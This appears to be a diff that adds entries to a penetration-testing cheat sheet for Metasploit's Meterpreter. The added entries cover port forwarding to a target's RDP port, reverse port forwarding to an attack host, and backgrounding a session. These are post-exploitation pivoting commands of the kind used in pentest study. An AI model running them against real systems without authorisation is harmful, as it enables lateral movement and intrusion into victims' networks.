@@ -208,3 +208,23 @@ timestomp
 ```
 reboot
 ```
+
+## meterpreter - Display portfwd features
+```
+meterpreter > help portfwd
+```
+
+## meterpreter - Add port forwarding rule
+```
+meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>
+```
+
+## meterpreter - Add reverse port forwarding
+```
+meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>
+```
+
+## meterpreter - Background session
+```
+meterpreter > bg
+```
